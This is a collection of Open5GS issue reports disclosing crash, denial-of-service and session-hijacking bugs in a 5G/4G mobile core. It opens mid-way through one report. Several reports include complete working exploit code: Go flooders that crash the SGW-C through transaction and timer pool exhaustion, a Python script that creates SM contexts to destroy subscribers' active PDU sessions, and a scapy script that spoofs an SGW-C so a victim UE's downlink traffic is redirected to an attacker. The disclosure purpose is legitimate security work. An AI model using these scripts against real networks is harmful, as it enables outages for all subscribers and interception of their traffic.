				seq := uint32(workerID*10000 + j)
				ueIndex := (workerID*requestsPerWorker + j) % *maxUE
				msg := buildCSR(seq, ueIndex, *pgwIP)

				data, _ := message.Marshal(msg)
				conn.Write(data)

				mu.Lock()
				sentCount++
				if sentCount%100 == 0 {
					fmt.Printf("[*] Sent %d requests...\n", sentCount)
				}
				mu.Unlock()

				if *delay > 0 {
					time.Sleep(*delay)
				}
			}
		}(i)
	}

	wg.Wait()
	fmt.Println("----------------------------------------------------------")
	fmt.Printf("[+] Total requests sent: %d\n", sentCount)
	fmt.Println("[*] Expected crash: ogs_pfcp_xact_local_create: Assertion 'xact->tm_delayed_commit' failed")
	fmt.Println("[*] Check: docker logs sgwc | grep 'pfcp_xact_local_create'")
}

func buildCSR(seq uint32, ueIndex int, pgwIP string) *message.CreateSessionRequest {
	imsi := fmt.Sprintf("001010000000%03d", ueIndex)
	localIP := "192.168.100.1"
	mmeTEID := uint32(0x10000000 + seq)
	pgwTEID := uint32(0x20000000 + seq)

	senderFTEID := ie.NewFullyQualifiedTEID(
		gtpv2.IFTypeS11MMEGTPC, mmeTEID, localIP, "",
	)

	// PGW S5/S8 F-TEID - THIS triggers SGW-C to forward to PGW (via PFCP first)
	pgwFTEID := ie.NewFullyQualifiedTEID(
		gtpv2.IFTypeS5S8PGWGTPC, pgwTEID, pgwIP, "",
	).WithInstance(1)

	ebi := uint8(5 + (seq % 11))
	enbTEID := uint32(0x30000000 + seq)
	enbFTEID := ie.NewFullyQualifiedTEID(
		gtpv2.IFTypeS1UeNodeBGTPU, enbTEID, localIP, "",
	)

	bearer := ie.NewBearerContext(
		ie.NewEPSBearerID(ebi),
		enbFTEID,
		ie.NewBearerQoS(1, 2, 1, 9, 50000, 50000, 50000, 50000),
	)

	apns := []string{"internet", "ims", "mms", "enterprise", "vpn", "iot", "voip", "data"}
	apn := apns[int(seq)%len(apns)]

	return message.NewCreateSessionRequest(
		0, seq,
		ie.NewIMSI(imsi),
		ie.NewMSISDN("0000000000"),
		ie.NewMobileEquipmentIdentity("353490061234560"),
		ie.NewServingNetwork("001", "01"),
		ie.NewRATType(gtpv2.RATTypeEUTRAN),
		ie.NewPDNType(gtpv2.PDNTypeIPv4),
		ie.NewSelectionMode(gtpv2.SelectionModeMSorNetworkProvidedAPNSubscribedVerified),
		ie.NewAccessPointName(apn),
		ie.NewAggregateMaximumBitRate(500000, 500000),
		senderFTEID,
		pgwFTEID,
		bearer,
	)
}

```
3. Download required libraries: `go mod tidy`
4. Run the program with the SGW-C address: `go run ./main.go --target 10.44.44.2`

### Logs

```shell
01/07 08:01:03.127: [event] FATAL: ogs_pool_alloc() failed (../lib/core/ogs-timer.c:84)
01/07 08:01:03.127: [pfcp] FATAL: ogs_pfcp_xact_local_create: Assertion `xact->tm_delayed_commit' failed. (../lib/pfcp/xact.c:104)
01/07 08:01:03.127: [core] FATAL: backtrace() returned 10 addresses (../lib/core/ogs-abort.c:37)
/usr/local/lib/libogspfcp.so.2(ogs_pfcp_xact_local_create+0x4db) [0x7bb4faeb69c7]
```

items.title: SMF aborts on two QoS rules for the same QFI in one PDU Session Modification Request

labels.name: status:already-fixed
labels.description: This issue has already been fixed in the codebase or addressed in a previous issue.

items.body:
## Symptom

`ogs_assert_if_reached()` in `gsm_handle_pdu_session_modification_request()` terminates
the SMF process. `ogs_assert_if_reached()` is `ogs_fatal()` + `ogs_abort()`, so every PDU
session of every other subscriber goes down with it. The flag combination that reaches it
is decoded from the QoS rules IE the UE sent, so a single malformed NAS message from one
subscriber is enough. No timing or race is involved.

This is the same assertion that #4672 reached through the QoS flow descriptions IE.
`72913dc92` closed that route. The QoS rules IE reaches it without any help from the QoS
flow descriptions handler, and that route is still open on current main.

## Reproducer

- Open5GS commit: bb810d384
- Config: stock 5GC, one subscriber with one active PDU session and one QoS flow.
- Trigger: after the session is established, send one PDU SESSION MODIFICATION REQUEST
  whose QoS rules IE (TS 24.501 9.11.4.13) carries two rules naming the **same existing**
  QFI X:

  | rule | operation code | QFI | packet filters |
  |------|----------------|-----|----------------|
  | 1 | 2 — delete existing QoS rule | X | none |
  | 2 | 1 — create new QoS rule | X | >= 1 |

  Both orders of the two rules reach the assertion.

- Expected: the request is answered, the SMF stays up.
- Actual:

```
[gsm] INFO : Requested QoS rule [code:2 id:1 num_of_packet_filter:0]  gsm-handler.c:245
[gsm] INFO : Requested QoS rule [code:1 id:1 num_of_packet_filter:1]  gsm-handler.c:245
[gsm] ERROR: Invalid modification request
             [REMOVE combined with TFT/QOS-MODIFY pfcp_flags:0x480]   gsm-handler.c:607
[gsm] FATAL: gsm_handle_pdu_session_modification_request:
             should not be reached.                                   gsm-handler.c:611
[core] FATAL: backtrace() returned 10 addresses                       ogs-abort.c:37
```

  The SMF process is gone at this point.

## Root cause analysis

Rule 1 (delete) sets `OGS_PFCP_MODIFY_REMOVE` and puts the QoS flow on
`sess->qos_flow_to_modify_list`. Rule 2 (create) sets `OGS_PFCP_MODIFY_TFT_NEW` for the
same QFI; `qos_flow_find_or_add()` does not add a second list entry for a flow already on
the list. The list therefore still holds exactly one element and passes the
`ogs_list_count(&sess->qos_flow_to_modify_list) != 1` check at gsm-handler.c:585.

`pfcp_flags` is now `REMOVE|TFT_NEW`, which is exactly the combination the block at
gsm-handler.c:592 was written to catch — and it catches it with `ogs_assert_if_reached()`.

`pfcp_flags` here is not an internal invariant. It is derived entirely from the QoS rules
IE (9.11.4.13) and the QoS flow descriptions IE (9.11.4.12) of the UE's request, so every
combination reachable at that point is remote input.

The comment directly above the check already says what should happen instead:

> pfcp_flags is derived from the content of the UE's PDU Session Modification Request, so
> a misbehaving UE can request a removal combined with a TFT/QoS modification for the same
> QoS flow. This is invalid input, not an internal error: log the exact flag combination
> and reject the request instead of aborting the SMF.

The log line is there; the rejection is not.

## Spec reference

TS 24.501 V18.13.0 §6.4.2.4.1 — "UE-requested PDU session modification procedure not
accepted by the network", General:

> Upon receipt of a PDU SESSION MODIFICATION REQUEST message, if the SMF does not accepts
> the request to modify the PDU session, the SMF shall create a PDU SESSION MODIFICATION
> REJECT message.

and, further down the same clause:

> The SMF shall send the PDU SESSION MODIFICATION REJECT message.

The clause lists the cause values it expects there, among them `#95 - 111 protocol
errors`, which covers the `#96 "invalid mandatory information"` that the existing
`cleanup:` path already uses. The message itself is defined in §8.3.8, the QoS rules IE
and its operation codes in §9.11.4.13.

## Suggested fix (optional)

The function already has a rejection path: `cleanup:` at gsm-handler.c:642 builds a
PDU SESSION MODIFICATION REJECT and returns `OGS_ERROR`, and every other unacceptable
request in this function goes there. Replacing the `ogs_assert_if_reached()` with a jump
to that path would make the code do what its comment describes. Which 5GSM cause fits best
is your call — the existing path uses `OGS_5GSM_CAUSE_INVALID_MANDATORY_INFORMATION`.

The other `ogs_assert_if_reached()` in the QoS rules loop of this file looks unreachable
from UE input: its enclosing else-if already restricts the operation code to the three
values the chain covers. It seems fine as a defensive invariant.

## Related

- #4672 — same assertion, reached through the QoS flow descriptions IE; fixed by 72913dc92.
  This report is the remaining route into the same assertion.
- #4512 / #4429 — same message shape, reported earlier; 884747c30 fixed the packet-filter
  index handling in `reconfigure_packet_filter()`, which is a different defect in the same
  request.

items.title: [Bug]: SGW-C crashes via GTP remote transaction timer pool exhaustion (ogs_assert(xact->tm_peer))

items.body:
### Open5GS Release, Revision, or Tag

v2.7.6



### Description
send  GTPv2 Create Session Request (CSR) messages to SGW-C (S11) without PGW F-TEID, SGW-C repeatedly creates remote transactions for incoming requests. The timer pool is exhausted before the transaction pool (observed behavior suggests ~3 timers per remote xact). Once timer allocation fails, ogs_timer_add() effectively returns NULL, leading to ogs_gtp_xact_remote_create() hitting the assertion:
Crash location: lib/gtp/xact.c:219
Assertion: ogs_assert(xact->tm_peer)

### Steps to reproduce
Preceded by: ogs_pool_alloc() failed in lib/core/ogs-timer.c:84

1. Start a new go project inside a new folder: `go mod init poc`
2. Create a `main.go` and paste the code below:
```
// Vuln-PC1-13 PoC: GTP Remote Transaction Pool Exhaustion
// Target: SGW-C - ogs_gtp_xact_remote_create() assertion
// Crash Location: lib/gtp/xact.c:219
// Assertion: ogs_assert(xact->tm_peer)
//
// Attack Strategy:
// - Send CSR WITHOUT PGW F-TEID (no forwarding to PGW)
// - SGW-C creates remote transactions to handle incoming requests
// - Timer pool exhausts before xact pool (3 timers per xact)
// - ogs_timer_add() returns NULL -> assertion fails

package main

import (
	"flag"
	"fmt"
	"log"
	"net"
	"sync"
	"time"

	"github.com/wmnsk/go-gtp/gtpv2"
	"github.com/wmnsk/go-gtp/gtpv2/ie"
	"github.com/wmnsk/go-gtp/gtpv2/message"
)

var (
	target      = flag.String("target", "", "Target SGW-C IP (required)")
	port        = flag.Int("port", 2123, "GTP-C port")
	count       = flag.Int("count", 500, "Number of requests to send")
	concurrency = flag.Int("concurrency", 50, "Number of concurrent senders")
	delay       = flag.Duration("delay", 1*time.Millisecond, "Delay between requests")
	maxUE       = flag.Int("max-ue", 1, "Number of unique IMSIs")
)

func main() {
	flag.Parse()

	if *target == "" {
		log.Fatal("--target is required")
	}

	fmt.Println("==========================================================")
	fmt.Println("Vuln-PC1-13 PoC: ogs_gtp_xact_remote_create Assertion")
	fmt.Println("==========================================================")
	fmt.Printf("[*] Target: %s:%d (SGW-C S11)\n", *target, *port)
	fmt.Printf("[*] Crash Location: lib/gtp/xact.c:219\n")
	fmt.Printf("[*] Assertion: ogs_assert(xact->tm_peer)\n")
	fmt.Println("[*] Strategy: CSR without PGW F-TEID -> remote xact only")
	fmt.Println("----------------------------------------------------------")

	addr := fmt.Sprintf("%s:%d", *target, *port)
	remoteAddr, err := net.ResolveUDPAddr("udp", addr)
	if err != nil {
		log.Fatalf("Failed to resolve address: %v", err)
	}

	var wg sync.WaitGroup
	requestsPerWorker := *count / *concurrency
	sentCount := 0
	var mu sync.Mutex

	for i := 0; i < *concurrency; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()

			conn, err := net.DialUDP("udp", nil, remoteAddr)
			if err != nil {
				return
			}
			defer conn.Close()

			for j := 0; j < requestsPerWorker; j++ {
				seq := uint32(workerID*10000 + j)
				ueIndex := (workerID*requestsPerWorker + j) % *maxUE
				msg := buildCSR(seq, ueIndex)

				data, _ := message.Marshal(msg)
				conn.Write(data)

				mu.Lock()
				sentCount++
				if sentCount%100 == 0 {
					fmt.Printf("[*] Sent %d requests...\n", sentCount)
				}
				mu.Unlock()

				if *delay > 0 {
					time.Sleep(*delay)
				}
			}
		}(i)
	}

	wg.Wait()
	fmt.Println("----------------------------------------------------------")
	fmt.Printf("[+] Total requests sent: %d\n", sentCount)
	fmt.Println("[*] Expected crash: ogs_gtp_xact_remote_create: Assertion 'xact->tm_peer' failed")
	fmt.Println("[*] Check: docker logs sgwc | grep 'xact_remote_create'")
}

func buildCSR(seq uint32, ueIndex int) *message.CreateSessionRequest {
	imsi := fmt.Sprintf("001010000000%03d", ueIndex)
	localIP := "192.168.100.1"
	mmeTEID := uint32(0x10000000 + seq)

	senderFTEID := ie.NewFullyQualifiedTEID(
		gtpv2.IFTypeS11MMEGTPC, mmeTEID, localIP, "",
	)

	ebi := uint8(5 + (seq % 11))
	bearer := ie.NewBearerContext(
		ie.NewEPSBearerID(ebi),
		ie.NewBearerQoS(1, 2, 1, 9, 50000, 50000, 50000, 50000),
	)

	apns := []string{"internet", "ims", "mms", "enterprise", "vpn", "iot", "voip", "data"}
	apn := apns[int(seq)%len(apns)]

	// NO PGW F-TEID - SGW-C will only create remote transaction
	return message.NewCreateSessionRequest(
		0, seq,
		ie.NewIMSI(imsi),
		ie.NewMSISDN("0000000000"),
		ie.NewMobileEquipmentIdentity("353490061234560"),
		ie.NewServingNetwork("001", "01"),
		ie.NewRATType(gtpv2.RATTypeEUTRAN),
		ie.NewPDNType(gtpv2.PDNTypeIPv4),
		ie.NewSelectionMode(gtpv2.SelectionModeMSorNetworkProvidedAPNSubscribedVerified),
		ie.NewAccessPointName(apn),
		ie.NewAggregateMaximumBitRate(500000, 500000),
		senderFTEID,
		bearer,
	)
}
```
3. Download required libraries: `go mod tidy`
4. Run the program with the SGW-C address: `go run main.go --target 10.44.44.2`

### Logs

```shell
01/07 07:53:05.297: [event] FATAL: ogs_pool_alloc() failed (../lib/core/ogs-timer.c:84)
01/07 07:53:05.297: [gtp] FATAL: ogs_gtp_xact_remote_create: Assertion `xact->tm_peer' failed. (../lib/gtp/xact.c:219)
01/07 07:53:05.297: [core] FATAL: backtrace() returned 9 addresses (../lib/core/ogs-abort.c:37)
/usr/local/lib/libogsgtp.so.2(+0x1ab88) [0x7b0f43548b88]
/usr/local/lib/libogsgtp.so.2(ogs_gtp_xact_receive+0x4d3) [0x7b0f4354c886]
open5gs-sgwcd(+0x14bc5) [0x5629d243fbc5]
/usr/local/lib/libogscore.so.2(ogs_fsm_dispatch+0x119) [0x7b0f4350a43f]
open5gs-sgwcd(+0x639a) [0x5629d243139a]
/usr/local/lib/libogscore.so.2(+0x119a3) [0x7b0f434fa9a3]
/lib/x86_64-linux-gnu/libc.so.6(+0x94ac3) [0x7b0f4332fac3]
/lib/x86_64-linux-gnu/libc.so.6(clone+0x44) [0x7b0f433c0a74]
/usr/local/bin/entrypoint.sh: line 8:     8 Aborted                 (core dumped) open5gs-sgwcd "${@}"
```

### Expected behaviour

SGW-C should handle resource exhaustion gracefully (e.g., reject/ignore the request with an error response, rate-limit, or clean up partially created state) and must not crash due to an assertion when timer allocation fails.



### Observed Behaviour

SGW-C crashes under load after timer pool allocation failure.

No

items.title: [BUG] AMF crash (ogs_assert_if_reached) when Namf_Communication response arrives during authentication state

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
## Description

`gmm_state_authentication()` in `src/amf/gmm-sm.c` handles `OGS_EVENT_SBI_CLIENT`
responses via a `switch (service_name_id)` that only has cases for
`OpenAPI_service_name_nausf_auth`, `OpenAPI_service_name_nudm_uecm`,
`OpenAPI_service_name_nudm_sdm`, and `OpenAPI_service_name_npcf_am_policy_control`.
There is no case for `OpenAPI_service_name_namf_comm`. If an `Namf_Communication`
SBI response arrives while the UE's GMM FSM is in the `authentication` state, it
falls through to the `default:` branch of that switch, which calls
`ogs_assert_if_reached()` — this terminates the AMF process (crash / DoS for all
UEs served by that AMF instance, not just the one that triggered it).

By contrast, `gmm_state_de_registered()`, `gmm_state_registered()`,
`gmm_state_security_mode()`, and `gmm_state_exception()` all *do* have a
`case OpenAPI_service_name_namf_comm:` in their respective SBI response
switches. `gmm_state_authentication()` (and `gmm_state_initial_context_setup()`)
appear to be missing it.

**This is not theoretical — I reproduced the crash.** Log output (two
independent runs, identical except for ASLR addresses):

```
[gmm] ERROR: Invalid service name [namf-comm] (../src/amf/gmm-sm.c:2547)
[gmm] FATAL: gmm_state_authentication: should not be reached. (../src/amf/gmm-sm.c:2548)
[core] FATAL: backtrace() returned 9 addresses (../lib/core/ogs-abort.c:37)
open5gs-amfd(+0x43360) [...]
libogscore.so.2(ogs_fsm_dispatch+0x11f) [...]
open5gs-amfd(+0x4f083) [...]
libogscore.so.2(ogs_fsm_dispatch+0x11f) [...]
open5gs-amfd(+0xbbe6) [...]
libogscore.so.2(+0x12c73) [...]
libc.so.6(+0xa40da) [...]
libc.so.6(+0x1377ac) [...]
```

## How I triggered it

Using the existing `tests/transfer/ue-context-transfer-test.c` harness's
Old-AMF/Target-AMF topology (`transfer.yaml`'s two `amf:` blocks) as a base:

1. Register a UE to Old AMF (full registration + PDU session, as in
   `test2_func`).
2. Register the same UE to Target AMF with Old AMF's 5G-GUTI. This triggers
   `gmm_registration_request_from_old_amf()` in `gmm_state_registered()`,
   which sends `Namf_Communication` `UEContextTransfer` to Old AMF and stays
   in `registered` (this part resolves cleanly and is exercised by the
   existing test already — Target AMF proceeds through `authentication` and
   `security_mode` normally).
3. Send Security Mode Complete. Because
   `amf_ue_context_transfer_state == UE_CONTEXT_TRANSFER_NEW_AMF_STATE`
   (set during step 2), `gmm_state_security_mode()` now sends a *second*
   `Namf_Communication` request (`RegistrationStatusUpdate`) to Old AMF and
   stays in `security_mode`.
4. **Without waiting for that response**, immediately send a second
   Registration Request over the same NGAP connection.
   `gmm_state_security_mode()`'s `OGS_NAS_5GS_REGISTRATION_REQUEST` case
   transitions unconditionally to `gmm_state_authentication()` — nothing
   checks whether an `Namf_Communication` transaction from step 3 is still
   outstanding.
5. When Old AMF's `RegistrationStatusUpdate` response arrives, it is
   dispatched to the UE's *current* state (now `authentication`), which
   doesn't handle `namf_comm` → abort.

The SBI response dispatch (`amf_state_operational()` in `src/amf/amf-sm.c`)
looks the transaction up by id and dispatches unconditionally to the UE's
current FSM state — I didn't find any check that the current state matches
the state the request was originally sent from, or any code that
cancels/invalidates the outstanding transaction when the FSM transitions away
from the state that sent it. That's why step 4's timing wins the race in
practice: it's a local NGAP/SCTP write, versus Old AMF's real SBI HTTP
round-trip for step 3's response.

There's a second, independent way to reach the same crash without step 3/4 at
all: if the NAS event that follows step 2's `UEContextTransfer` (before its
response arrives) is something other than Authentication Response — e.g.
another Identity Response or Registration Request — that would also drive the
FSM to `authentication` while the *first* `Namf_Communication` transaction is
still outstanding. I didn't build a harness for that variant since the one
above was enough to reproduce, but the same missing-guard reasoning applies.

## Precedent in the same function

`gmm_state_authentication()` already has explicit handling for exactly this
*class* of problem for other services, added reactively as real issues were
hit in production:

- `nudm_uecm`, `REGISTRATIONS` resource: `PUT`/`PATCH` methods are explicitly
  ignored with comments referencing #2733 and #4074 ("We need to ignore this
  message in this state").
- `nudm_sdm`, `SDM_SUBSCRIPTIONS` `DELETE` response: explicitly ignored with a
  comment referencing #4209 ("a DELETE response for SDM_SUBSCRIPTIONS may
  arrive while the AMF is already handling a subsequent Registration Request
  ... intentionally ignored").
- `nudm_sdm` late dataset-names response (no resource component[1]): also
  explicitly ignored ("the UE state has changed since the request was sent;
  ignore it instead of asserting").

`namf_comm` appears to be the one service in this switch that never received
the equivalent fix.

## Suggested fix

Add a `case OpenAPI_service_name_namf_comm:` to the `OGS_EVENT_SBI_CLIENT`
switch in `gmm_state_authentication()` (and possibly
`gmm_state_initial_context_setup()`, which has the same gap) that ignores a
late `UEContextTransfer`/`RegistrationStatusUpdate` response instead of
asserting, following the same pattern already used for `nudm_uecm`/`nudm_sdm`
in this same function.

## Version

Checked against current `main` (`e2aeae26d7e4c447d77539bdff88b67638c9d46b`,
2025-07-13) — this function has not changed since.

## How this was found

Found via formal-methods analysis of the AMF GMM state machine (TLA+ model
checking of the FSM's SBI-response handling), then confirmed by manual
code-level tracing and finally reproduced live as described above (built
current `main` locally, ran a modified version of the existing
`ue-context-transfer-test.c` harness). Happy to share the TLA+ model, the test
harness diff, or help test a fix if useful.

items.body:
# Memory leak in UDM context with SUCI-only attachments causing “No memory pool” error

**Environment:**

- **Open5GS version:** v2.7.5
- **Components affected:** UDM
- **Test profile:** SUCI-only (profile A)
- **Max UE config:** 1000

## Description

When performing continuous UE attachment attempts using a SUCI-only profile without registering the IMSI in the subscriber database, UDM’s memory pool is not being released correctly after an Registration Reject. After roughly 1000 attempts (matching the configured UE limit), UDM logs:

```text
udm/context.c line 158 ogs_error("No memory pool [%s]", suci);
```

This indicates exhaustion of the underlying memory pool and suggests a leak in the UDM context-handling path. Initial checks confirm that UDR does **not** exhibit the same behavior.

## Steps to Reproduce

1. Configure Open5GS with UDM and UDR, max UE = 1000.
2. Use a SUCI-only test UE profile (profile A).
3. Perform continuous Registration attempts:
   - Allow the first few to succeed (simulating known UEs).
   - Continue registering with unknown SUCIs until an Registration Reject occurs.
4. Observe UDM logs and check memory pool usage.

## Observed Behavior

- UDM logs repeated failures:
  ```text
  WARNING: [suci-…] HTTP response error [404] (../src/udm/nudr-handler.c:87)
  ERROR: udm/context.c:158: No memory pool [<suci>]
  ```
- After \~1000 unknown SUCI attempts, the UDM memory pool is exhausted.

## Expected Behavior

- Memory allocated for each Registration attempt should be properly freed after:
  - Successful registration
  - Registration reject (NAS context release)
- No “No memory pool” errors under normal continuous testing.

## Logs

- **Error snippet from UDM:**
  ```
  04/18 22:14:12.642 WARNING: … HTTP response error [404] (nudr-handler.c:87)
  udm/context.c line 158 ogs_error("No memory pool [%s]", suci);
  ```

items.title: [SMF] Building new SM contexts destroys active PDU sessions and leads to the DoS of targeted subscribers
items.body:
### Open5GS Release, Revision, or Tag

v2.7.0

### Steps to reproduce

Open5GS installed on Kubernetes with Helm.

Use a similar pduSessionID during the building of a new SM context with a SUPI that already in used :
- imsi-999700000000001
- imsi-999700000000002

```python
import httpx
import json
from binascii import unhexlify



def CreateSMContext():
    #From pycrate
    n1SmMsg = "2e0101c1ffff91a12801007b000780000a00000d00"
    #n1SmMsg = "2e0201c1ffff91a12801007b000780000a00000d00"
    n1SmMsg = unhexlify(n1SmMsg)

    boundary = b'fcbc1f860c11bface713c937326db4f4b340ad2ac57e616472102bc843f4'
    content_type = "multipart/related; boundary=" + boundary.decode('utf-8')
    url = "https://o5.smf.5gc.mnc070.mcc999.3gppnetwork.org/nsmf-pdusession/v1/sm-contexts"
    headers = {"accept": "application/json", "accept-encoding":"gzip","Content-Type": content_type}
    jsonData = json.dumps({"supi":"imsi-999700000000001","pei":"imeisv-4370816125816151","pduSessionId":1,"dnn":"internet","sNssai":{"sst":1,"sd":"111111"},"servingNfId":"b7dc2632-4a31-41f0-b72d-e14229464882","guami":{"plmnId":{"mcc":"999","mnc":"70"},"amfId":"020040"},"servingNetwork":{"mcc":"999","mnc":"70"},"n1SmMsg":{"contentId":"5gnas-sm"},"anType":"3GPP_ACCESS","ratType":"NR","ueLocation":{"nrLocation":{"tai":{"plmnId":{"mcc":"999","mnc":"70"},"tac":"000001"},"ncgi":{"plmnId":{"mcc":"999","mnc":"70"},"nrCellId":"000000100"},"ueLocationTimestamp":"2025-03-21T12:31:46.516112Z"}},"ueTimeZone":"+00:00","smContextStatusUri":"http://10.244.5.52:7777/namf-callback/v1/imsi-999700000000001/sm-context-status/1","pcfId":"21a224b4-4a31-41f0-9c02-010e0fc2e6e3"})
    #jsonData = json.dumps({"supi":"imsi-999700000000002","pei":"imeisv-4370816125816152","pduSessionId":1,"dnn":"internet","sNssai":{"sst":1,"sd":"111111"},"servingNfId":"b7dc2632-4a31-41f0-b72d-e14229464882","guami":{"plmnId":{"mcc":"999","mnc":"70"},"amfId":"020040"},"servingNetwork":{"mcc":"999","mnc":"70"},"n1SmMsg":{"contentId":"5gnas-sm"},"anType":"3GPP_ACCESS","ratType":"NR","ueLocation":{"nrLocation":{"tai":{"plmnId":{"mcc":"999","mnc":"70"},"tac":"000001"},"ncgi":{"plmnId":{"mcc":"999","mnc":"70"},"nrCellId":"000000100"},"ueLocationTimestamp":"2025-03-21T12:31:46.516112Z"}},"ueTimeZone":"+00:00","smContextStatusUri":"http://10.244.5.52:7777/namf-callback/v1/imsi-999700000000002/sm-context-status/1","pcfId":"21a224b4-4a31-41f0-9c02-010e0fc2e6e3"})
    #print(jsonData)

    multipart_header_json = b'Content-Type: application/json'
    multipart_header_nas = b'Content-Type: application/vnd.3gpp.5gnas'
    content_id = b'Content-Id: 5gnas-sm'
    content = b'--' + boundary + b'\r\n' + \
              multipart_header_json + b'\r\n\r\n' + jsonData.encode() + b'\r\n' + \
              b'--' + boundary + b'\r\n' + \
              content_id + b'\r\n' + multipart_header_nas + b'\r\n\r\n' + n1SmMsg + \
              b'\r\n--' + boundary + b'--\r\n'

    request = httpx.Request(
                "POST",
                url,
                headers=headers,
                content=content
                )

    with httpx.Client(http2=True,http1=False, verify=False) as client:
        response = client.send(request)

        print(response.text)
        print(response.status_code)
```
SMF release PDU sessions :

![Image](https://github.com/user-attachments/assets/6b76661c-9f16-4b84-a041-4e8d2e84381e)

AMF clear SM sessions :

![Image](https://github.com/user-attachments/assets/ac49bbba-4ec7-4598-8e08-43d9de57b085)

### Logs

```shell

```

### Expected behaviour

SMF should drop the POST request with similar pduSessionID and AMF should not clear active SM context sessions to avoid a DoS of a targeted subscriber.
Only the HTTP "DELETE" method should be able to delete SM Contexts and PDU sessions, especially if an authorization mechanism is applied on the API and allows access only to POST and PATCH methods for example.


### Observed Behaviour

When you send a POST /sm-contexts requests that contains a Session Establishment Request with a similar pduSessionID, SMF release the active PDU session and AMF clears active SM Context sessions used by subscribers. You can also create a loop to destroy all active PDU sessions and all subscribers will no longer be able to access the DNN.

Connectivity OK :

![Image](https://github.com/user-attachments/assets/a9db0bef-d807-4e33-92e6-37b192b6db43)


Connectivity KO after send a POST /sm-contexts with same pduSessionID for the both targeted SUPI :

![Image](https://github.com/user-attachments/assets/f0428cb7-323f-49aa-8820-572e178d267b)

### eNodeB/gNodeB

UERANSIM 3.2.6

### UE Models and versions

UERANSIM 3.2.6

items.title: [Bug]: UPF allows duplicate PFCP session for existing UE IP, enabling DoS and session hijacking attacks
items.body:
### Open5GS Release, Revision, or Tag

v2.7.2

### Steps to reproduce

1.Deploy Open5GS using containers. The SMF (corresponding to PGW-C in 4G) is assigned the IP address 172.22.0.7.
2.Use srsenb_zmq and srsue_zmq to simulate the eNodeB and UE, respectively, and connect the UE to the network.
3.Initially, the UE can communicate normally after successful attachment.
![Image](https://github.com/user-attachments/assets/da32f758-30ab-43f1-90d8-9fcbed2eeac1)
4.Use Wireshark to capture traffic during the session.
5.An attacker sends a crafted Create Session Request to the SMF (PGW-C) from a spoofed SGW-C with IP address 172.22.0.100.In the GTP message, the attacker sets: pdn_address_allocation = IE_PAA(length=5, PDN_type=1, ipv4=UE_IP) where UE_IP is the IP address of the legitimate (victim) UE, not dynamically allocated by the SMF. No other credentials or internal knowledge of the session is required by the attacker.
```from scapy.contrib.gtp_v2 import *
from scapy.all import IP, UDP, send
def construct_create_session_request(sgwc_IP, UE_IP, sgwu_IP):
    create_session_request = GTPHeader(
        version=2, T=1, gtp_type=32, seq=1, P=0, teid=0
    )
    imsi = IE_IMSI(length=8, IMSI="466920123456794")
    imei = IE_MEI(length=8, MEI="3534900698733153")
    user_location_info = IE_ULI(length=13,ECGI_Present=1,TAI_Present=1,TAI=ULI_TAI(MCC="466",MNC="92"),ECGI=ULI_ECGI(MCC="466",MNC="92"))
    serving_network = IE_ServingNetwork(length=3,MCC="466",MNC="92")
    rat_type = IE_RAT(length=1, RAT_type=6)
    Indication = IE_Indication(length=8, CRSI=1, ENBCRSI=1)
    fully_qualified_teid = IE_FTEID(
        length=9, ipv4_present=1, InterfaceType=6, GRE_Key=0x00000834, ipv4=sgwc_IP
    )
    apn = IE_APN(length=9, APN="internet")
    select_mode = IE_SelectionMode(length=1, SelectionMode=0)
    pdn_type = IE_PDN_type(length=1, PDN_type=1)
    pdn_address_Allocation = IE_PAA(length=5, PDN_type=1, ipv4=UE_IP)
    apn_restricatoin = IE_APN_Restriction(length=1)
    aggregate_Maximum_bit_Rate = IE_AMBR(
        length=8, AMBR_Uplink=1000000, AMBR_Downlink=1000000
    )
    bearer_Context = IE_BearerContext(length=44)
    eps_bearer_id = IE_EPSBearerID(length=1, EBI=5)
    fully_qualified_teid2 = IE_FTEID(
        length=9, ipv4_present=1, instance=2,InterfaceType=4, GRE_Key=0x0000ae33,ipv4=sgwu_IP
    )
    bearer_level_quality_of_service = IE_Bearer_QoS(length=22, PCI=1, PVI=1, QCI=9,PriorityLevel=8)
    ue_time_zone = IE_UE_Timezone(length=2)
    create_session_request /= (
        imsi
        / imei
        / user_location_info
        / serving_network
        / rat_type
        / Indication
        / fully_qualified_teid
        / apn
        / select_mode
        / pdn_type
        / pdn_address_Allocation
        / apn_restricatoin
        / aggregate_Maximum_bit_Rate
        / bearer_Context
        / eps_bearer_id
        / fully_qualified_teid2
        / bearer_level_quality_of_service
        / ue_time_zone
    )
    return create_session_request
def main():
    attacker_IP = "172.22.0.100"  
    UE_IP = "192.168.100.2" 
    smf_IP = "172.22.0.7"
    packet = construct_create_session_request(attacker_IP, UE_IP, attacker_IP)
    packet = IP(src=attacker_IP,dst=smf_IP) / UDP(sport=2123, dport=2123) / packet
    packet.show()
    send(packet)
if __name__ == "__main__":
    main()
```
![Image](https://github.com/user-attachments/assets/f93872be-1390-463d-a8f6-e3dbdfcf928e)

In response to the forged Create Session Request, the SMF (PGW-C) sends a PFCP Session Establishment Request to the UPF (PGW-U). The UPF uses the victim UE’s IP address to create a new downlink Packet Detection Rule (PDR), which causes the victim’s downlink packets to be forwarded to the attacker’s server.

6.After the attack succeeds, the original valid PDR still exists, so the UPF (PGW-U) can continue forwarding some downlink traffic to the legitimate UE. However, due to the malicious rule inserted by the attacker, part or all of the downlink traffic intended for the victim is hijacked and redirected to a server controlled by the attacker, resulting in both a Denial-of-Service (DoS) attack and session hijacking.

![Image](https://github.com/user-attachments/assets/80bd84a4-bf32-48f7-b4d8-1b367cb5acaa)

![Image](https://github.com/user-attachments/assets/d00b7f47-2d11-4088-9fb1-5555530fd77e)

### Expected behaviour

When the UPF (PGW-U) receives a new PFCP Session Establishment Request, it should verify whether the UE IP address conflicts with an existing session. If the same UE IP address is already in use, the UPF should reject the new session request instead of creating multiple forwarding rules for a conflicting IP address.

### Observed Behaviour

When the UPF (PGW-U) receives a new PFCP Session Establishment Request, it does not check whether the UE IP address conflicts with an existing session and directly creates the packet forwarding rules.


### Expected behaviour

When the UPF (PGW-U) receives a new PFCP Session Establishment Request, it should verify whether the UE IP address conflicts with an existing session. If the same UE IP address is already in use, the UPF should reject the new session request instead of creating multiple forwarding rules for a conflicting IP address.

### Observed Behaviour

When the UPF (PGW-U) receives a new PFCP Session Establishment Request, it does not check whether the UE IP address conflicts with an existing session and directly creates the packet forwarding rules.

### eNodeB/gNodeB

srsenb_zmq

